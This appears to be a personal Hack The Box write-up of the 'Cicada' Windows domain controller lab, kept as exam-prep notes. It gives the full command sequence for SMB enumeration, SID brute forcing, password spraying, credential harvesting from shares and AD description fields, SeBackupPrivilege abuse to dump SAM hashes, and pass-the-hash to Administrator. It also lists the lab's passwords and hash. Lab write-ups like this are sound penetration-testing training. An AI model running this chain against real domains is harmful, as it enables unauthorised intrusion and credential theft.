# HTB — Cicada

## Machine Info

| Field | Details |
|---|---|
| IP | 10.129.21.190 |
| Domain | cicada.htb |
| DC Hostname | CICADA-DC |
| FQDN | CICADA-DC.cicada.htb |
| OS | Windows Server |
| Difficulty | Easy |
| Status | Rooted |

---

## Credentials

| Account | Password | NTLM Hash | Source |
|---|---|---|---|
| michael.wrightson | `Cicada$M6Corpb*@Lp#nZp!8` | N/A | Default password in HR notice |
| david.orelious | `aRt$Lp#7t*VQ!3` | N/A | AD description field |
| emily.oscars | `Q!3@Lp#M6b*7t*Vt` | N/A | Backup_script.ps1 |
| Administrator | N/A | `2b87e7c93a3e8a0ea4a581937016f341` | SAM dump via SeBackupPrivilege |

---

## Attack Chain

### Phase A — Wide Port Scan
```bash
nmap -p- --min-rate 1000 -oN cicada-all-ports.txt 10.129.21.190
```

### Extract Ports for Phase B
```bash
ports=$(grep open cicada-all-ports.txt | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
```

### Phase B — Service Scan
```bash
nmap -p $ports -sC -sV --min-rate 1000 -oN service-scan.txt 10.129.21.190
```

**Findings:**
- Domain: `cicada.htb`
- Hostname: `CICADA-DC`
- DC confirmed (ports 88, 389, 445)
- WinRM open on 5985
- Clock skew: 6h58m — fix before Kerberos attacks

### Clock Sync
```bash
sudo timedatectl set-ntp off
sudo date -s "$(date -d "$(date) + 6 hours 58 minutes" '+%Y-%m-%d %H:%M:%S')"
```

### /etc/hosts
```bash
echo "10.129.21.190 cicada.htb CICADA-DC.cicada.htb" | sudo tee -a /etc/hosts
```

---

### Step 1 — SMB Enumeration

```bash
smbclient -L //10.129.21.190 -N
```

**Non-standard shares found:** DEV and HR

```bash
smbclient //10.129.21.190/DEV -N
```
Access denied.

```bash
smbclient //10.129.21.190/HR -N
```
Accessible. Contains `Notice from HR.txt`.

```bash
get "Notice from HR.txt"
cat "Notice from HR.txt"
```

**Finding:** Default password `Cicada$M6Corpb*@Lp#nZp!8` for new employees.

---

### Step 2 — User Enumeration via SID Brute Force

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
```

**Extract usernames to file:**
```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

**Users discovered:**
- Administrator
- Guest
- krbtgt
- CICADA-DC$
- john.smoulder
- sarah.dantelia
- michael.wrightson
- david.orelious
- emily.oscars

---

### Step 3 — Password Spray

```bash
crackmapexec smb cicada.htb -u users.txt -p '{redacted}'
```

**Hit:** `michael.wrightson` is still using the default password.

---

### Step 4 — Enumerate Users with michael.wrightson

```bash
crackmapexec smb cicada.htb -u michael.wrightson -p '{redacted}' --users
```

**Finding:** `david.orelious` has his password stored in his AD description field: `{redacted}`

---

### Step 5 — Access DEV Share as david.orelious

```bash
crackmapexec smb cicada.htb -u david.orelious -p '{redacted}' --shares
```

DEV share accessible with david.orelious credentials.

```bash
smbclient //cicada.htb/DEV -U 'david.orelious{redacted}'
get Backup_script.ps1
cat Backup_script.ps1
```

**Finding in script:**
```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "{redacted}" -AsPlainText -Force
```

---

### Step 6 — WinRM Shell as emily.oscars

```bash
evil-winrm -u emily.oscars -p '{redacted}' -i cicada.htb
```

```powershell
type C:\Users\emily.oscars.CICADA\Desktop\user.txt
# {redacted}
```

---

### Step 7 — Privilege Escalation via SeBackupPrivilege

```powershell
whoami /priv
```

**SeBackupPrivilege enabled.** This allows reading any file on the system regardless of ACLs, including the SAM and SYSTEM registry hives.

**Save registry hives:**
```powershell
reg save hklm\sam sam
reg save hklm\system system
```

**Download to Kali:**
```powershell
download sam
download system
```

**Dump hashes with impacket-secretsdump:**
```bash
impacket-secretsdump -sam sam -system system local
```

**Administrator NTLM hash:** `{redacted}`

---

### Step 8 — Pass-the-Hash as Administrator

```bash
evil-winrm -u Administrator -H {redacted} -i cicada.htb
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
# {redacted}
```

---

## Vulnerabilities

| Vulnerability | Location | Impact |
|---|---|---|
| Default password in HR notice on open SMB share | HR share | Domain user enumeration and password spray |
| User still using default password | michael.wrightson | Authenticated SMB access |
| Password stored in AD description field | david.orelious account | DEV share access |
| Plaintext credentials in PowerShell backup script | DEV share | emily.oscars WinRM access |
| SeBackupPrivilege on standard user | emily.oscars | SAM and SYSTEM hive extraction |
| Weak Administrator NTLM hash | SAM database | Full domain compromise via Pass-the-Hash |

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| smbclient | Anonymous SMB enumeration and file download |
| impacket-lookupsid | SID brute forcing for user enumeration |
| crackmapexec | Password spray and user enumeration |
| evil-winrm | WinRM shell |
| reg save | Registry hive extraction |
| impacket-secretsdump | NTLM hash extraction from SAM and SYSTEM |

---

## Exam-Focused Lessons Learned

1. **Always enumerate all non-standard SMB shares recursively.** DEV and HR both stood out immediately. HR gave the entry point via a default password in a plaintext file. Never skip a share because its name sounds boring.

2. **HR notices and onboarding documents on file shares almost always contain credentials.** Companies commonly put default passwords in welcome documents. These are gold. Always download and read every text file on an open share.

3. **impacket-lookupsid with guest access gives a full user list without admin rights.** This is the RID brute force equivalent via RPC. When anonymous SMB is available but rpcclient null sessions are blocked, lookupsid often still works through the guest account.

4. **Always spray default or discovered passwords against all enumerated users.** One user almost always skips the password change. On Cicada it was michael.wrightson. Spray every password against every user before moving on.

5. **AD description fields are checked for passwords immediately after getting authenticated access.** Users and admins sometimes store passwords in the description field for convenience. `crackmapexec smb --users` dumps these alongside the usernames. Always read the description column.

6. **Backup scripts and scheduled task scripts frequently contain plaintext credentials.** The DEV share contained a PowerShell backup script with emily.oscars credentials in a ConvertTo-SecureString call. Any .ps1, .bat, or .sh file on a file share is a credential hunting target.

7. **SeBackupPrivilege allows reading any file including SAM and SYSTEM hives.** This is a direct path to all local NTLM hashes. The attack is three commands: reg save, download, secretsdump. Memorise this chain for the exam.

8. **Pass-the-Hash with Administrator NTLM always works when WinRM is open.** Once you have the Administrator hash from secretsdump, evil-winrm -H delivers a shell immediately. Never try to crack the Administrator hash when PTH is available.

9. **User home directories on domain machines use the format username.DOMAIN.** On Cicada, emily's profile was at `C:\Users\emily.oscars.CICADA\`. When the standard path fails, list `C:\Users\` and navigate to the correct profile folder.

10. **The attack chain on this box is entirely credential-based with no exploitation.** Every step was finding a credential and using it to access the next layer. This is realistic AD assessment work and a common OSCP pattern.

---

## References

- [[Heist]] — RID brute force, credential spray
- [[Timelapse]] — LAPS, PowerShell credential exposure
- [[Checklists/Windows PrivEsc]]
- [[Checklists/Enumeration]]
